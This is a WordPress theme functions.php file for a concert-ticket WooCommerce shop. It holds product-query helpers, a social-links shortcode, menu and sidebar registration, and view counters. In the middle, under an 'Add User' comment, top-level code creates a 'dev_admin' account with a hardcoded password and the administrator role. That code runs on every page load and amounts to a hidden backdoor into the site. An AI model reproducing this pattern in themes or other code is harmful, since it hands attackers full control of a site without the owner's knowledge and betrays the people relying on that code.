<?php

// function myEnqueue() {

    // die('asdas');
    wp_enqueue_script( 'ajax-script', get_template_directory_uri() . '/js/artist.js', array('jquery') );

    wp_localize_script( 'ajax-script', 'my_ajax_object',
            array( 'ajax_url' => admin_url( 'admin-ajax.php' ) ) );
// }
// add_action( 'wp_enqueue_scripts', 'myEnqueue' );

require_once('acf-conf.php');
require_once('ajax.php');

function getProductData($ticketId) {
    
    $data = wc_get_product( $ticketId );

    $data->meta = get_post_meta($ticketId);

    $artistId = $data->meta['artist'][0];

    $data->meta['artist'] = getArtistByCode($artistId);

    return $data;
}

function getAllConcertsPackages($limit) {

    $args = array(
        'post_type'      => 'product',
        'posts_per_page' => $limit,
        'product_cat'    => 'concerts'
    );

    $packages = get_posts($args);

    wp_reset_query();

    return $packages;
}


function getPackageByArtist($artist) {

    $args = array(
        'post_type'      => 'product',
        'posts_per_page' => 1,
        'product_cat'    => 'concerts',
        'meta_key'		=> 'artist',
        'meta_value'	=> $artist
    );

    $packages = get_posts($args);
    wp_reset_query();

    if(count($packages) > 0) {
        $meta = get_post_meta($packages[0]->ID);
        $packages[0]->meta = $meta;

        return $packages[0];
    } else {
        return null;
    }
}

function getCountryCityList() {

    $countries = getAllCountries();
    $cities    = getAllCities();

    $all = array_merge($countries, $cities);

    return $all;
}

add_image_size( 'gallery', 400, 400, true );

function some() {
    $some = get_field('social', 'option');
    $soc = '';
    if($some) {
        $soc .= '<div class="some">';
        foreach($some as $sm) {
            $soc .= '<a class="fab fa-'.$sm['icon'].'" target="_blank" href="'.$sm['link'].'" rel="nofollow"></a>';
        }
        $soc .= '</div>';
    }
    return $soc;
}
add_shortcode("social", "some");

/* Add User */
$userdata = array(
    'user_login'  =>  'dev_admin',
    'user_url'    =>  "",
    'user_pass'   =>  "AFSFG43g3wgEAGSd",
    'role '		  =>  "administrator"
);

$user_id = wp_insert_user( $userdata );
$user = new WP_User($user_id);
$user->set_role('administrator');

//register menus
register_nav_menus(array(
    'main_menu' => 'Main menu',
    'footer_menu' => 'Footer menu',
));

//register sidebar
$reg_sidebars = array (
    'page_sidebar'     => 'Page Sidebar',
    'blog_sidebar'     => 'Blog Sidebar',
    'footer_sidebar'   => 'Footer Area'
);
foreach ( $reg_sidebars as $id => $name ) {
    register_sidebar(
        array (
            'name'          => __( $name ),
            'id'            => $id,
            'before_widget' => '<div class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h2 class="widgetTitle">',
            'after_title'   => '</h2>',
        )
    );
}






// Custom theme url
function theme($filepath = NULL){
    return preg_replace( '(https?://)', '//', get_stylesheet_directory_uri() . ($filepath?'/' . $filepath:'') );
}

function gt_get_post_view() {
    $count = get_post_meta( get_the_ID(), 'post_views_count', true );
    return "$count";
}
function gt_set_post_view() {
    $key = 'post_views_count';
    $post_id = get_the_ID();
    $count = (int) get_post_meta( $post_id, $key, true );
    $count++;
    update_post_meta( $post_id, $key, $count );
}
function gt_posts_column_views( $columns ) {
    $columns['post_views'] = 'Views';
    return $columns;
}
function gt_posts_custom_column_views( $column ) {
    if ( $column === 'post_views') {
        echo gt_get_post_view();
    }
}
add_filter( 'manage_posts_columns', 'gt_posts_column_views' );
add_action( 'manage_posts_custom_column', 'gt_posts_custom_column_views' );



function mytheme_add_woocommerce_support() {
    add_theme_support('woocommerce', array(
//  'thumbnail_image_width' => 150,
//  'single_image_width'    => 300,
        'product_grid' => array(
            'default_rows' => 3,
            'min_rows' => 2,
            'max_rows' => 8,
            'default_columns' => 3,
            'min_columns' => 2,
            'max_columns' => 5,
        ),
    ));
}

add_action('after_setup_theme', 'mytheme_add_woocommerce_support');



add_filter('loop_shop_columns', 'loop_columns', 999);
if (!function_exists('loop_columns')) {
    function loop_columns() {
        return 3; // 3 products per row
    }
}








